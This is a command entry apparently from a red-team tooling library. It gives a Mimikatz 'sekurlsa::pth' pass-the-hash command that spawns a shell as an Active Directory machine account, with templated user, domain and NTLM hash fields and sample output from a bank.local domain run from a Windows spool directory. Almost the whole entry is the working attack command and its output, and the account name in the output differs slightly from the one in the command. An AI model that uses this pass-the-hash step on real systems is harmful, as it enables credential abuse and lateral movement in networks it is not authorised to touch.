---
id: 2b43360e-450c-42ca-8fc7-1a946aacb74a
name: Mimikatz Spawn a Shell as an AD Machine Account
type: command
executor: command_prompt
data: Mimikatz.exe "sekurlsa::pth /user:$_MACHINE_NAME$ /domain:$_DOMAIN /ntlm:$_NTLM_HASH"
output: "C:\\Windows\\System32\\spool\\drivers\\color>.\\MimiKatz.exe \"sekurlsa::pth\
  \ /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83\"\n\n\
  \  .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48\n .## ^ ##.  \"A La\
  \ Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com\
  \ )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent\
  \ LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\n\nmimikatz(commandline) # sekurlsa::pth /user:SQLSRV0101$\
  \ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83\nuser    : SQLSRV0101$\n\
  domain  : bank.local\nprogram : cmd.exe\nimpers. : no\nNTLM    : 374B2539A390DD9781DDF26FD6029F83\n\
  \  |  PID  3724\n  |  TID  1836\n  |  LSA Process is now R/W\n  |  LUID 0 ; 5434326\
  \ (00000000:0052ebd6)\n  \\_ msv1_0   - data copy @ 0000022C33601170 : OK !\n  \\\
  _ kerberos - data copy @ 0000022C3398A828\n   \\_ aes256_hmac       -> null\n  \
  \ \\_ aes128_hmac       -> null\n   \\_ rc4_hmac_nt       OK\n   \\_ rc4_hmac_old\
  \      OK\n   \\_ rc4_md4           OK\n   \\_ rc4_hmac_nt_exp   OK\n   \\_ rc4_hmac_old_exp\
  \  OK\n   \\_ *Password replace @ 0000022C339F0128 (32) -> null"
created_at: '2020-06-24T23:26:31.434306+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Spawn a Shell as an AD Machine Account

```command_prompt
Mimikatz.exe "sekurlsa::pth /user:$_MACHINE_NAME$ /domain:$_DOMAIN /ntlm:$_NTLM_HASH"
```

## Expected Output

```
C:\Windows\System32\spool\drivers\color>.\MimiKatz.exe "sekurlsa::pth /user:SQLSRV01$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83"

  .#####.   mimikatz 2.2.0 (x64) #18362 May  9 2020 20:52:48
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # sekurlsa::pth /user:SQLSRV0101$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83
user    : SQLSRV0101$
domain  : bank.local
program : cmd.exe
impers. : no
NTLM    : 374B2539A390DD9781DDF26FD6029F83
  |  PID  3724
  |  TID  1836
  |  LSA Process is now R/W
  |  LUID 0 ; 5434326 (00000000:0052ebd6)
  \_ msv1_0   - data copy @ 0000022C33601170 : OK !
  \_ kerberos - data copy @ 0000022C3398A828
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000022C339F0128 (32) -> null
```
